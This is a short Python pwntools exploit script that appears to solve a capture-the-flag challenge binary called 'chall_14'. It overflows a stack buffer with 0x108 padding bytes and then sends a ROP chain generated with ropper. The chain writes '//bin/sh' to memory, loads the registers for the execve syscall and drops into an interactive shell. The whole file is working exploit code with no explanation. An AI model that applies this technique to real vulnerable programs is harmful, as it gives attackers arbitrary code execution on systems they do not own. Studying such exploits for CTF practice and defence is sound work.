# coding: utf-8
from pwn import *
p = process("./chall_14")

#ropper --file chall_14 --chain "execve cmd=/bin/sh" --badbytes 0a
IMAGE_BASE_0 = 0x0000000000400000 # ed9d47356b7a87594e2a1418fcb428c827570eb42aaf9e93aaffa15ede38193d
rebase_0 = lambda x : p64(x + IMAGE_BASE_0)

rop = b''

rop += rebase_0(0x00000000000118f8) # 0x00000000004118f8: pop r13; ret;
rop += b'//bin/sh'

rop += rebase_0(0x0000000000001f9b) # 0x0000000000401f9b: pop rbx; ret;
rop += rebase_0(0x00000000000c00e0)
rop += rebase_0(0x0000000000084395) # 0x0000000000484395: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret;

rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)

rop += rebase_0(0x00000000000118f8) # 0x00000000004118f8: pop r13; ret;
rop += p64(0x0000000000000000)
rop += rebase_0(0x0000000000001f9b) # 0x0000000000401f9b: pop rbx; ret;
rop += rebase_0(0x00000000000c00e8)
rop += rebase_0(0x0000000000084395) # 0x0000000000484395: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret

rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)

rop += rebase_0(0x00000000000018ca) # 0x00000000004018ca: pop rdi; ret;
rop += rebase_0(0x00000000000c00e0)
rop += rebase_0(0x000000000000f3fe) # 0x000000000040f3fe: pop rsi; ret;
rop += rebase_0(0x00000000000c00e8)
rop += rebase_0(0x00000000000017cf) # 0x00000000004017cf: pop rdx; ret; 
rop += rebase_0(0x00000000000c00e8)
rop += rebase_0(0x00000000000494a7) # 0x00000000004494a7: pop rax; ret;
rop += p64(0x000000000000003b)
rop += rebase_0(0x00000000000170a4) # 0x00000000004170a4: syscall; ret; 

payload = b'A' * 0x108
payload += rop
p.sendline(payload)
p.interactive()
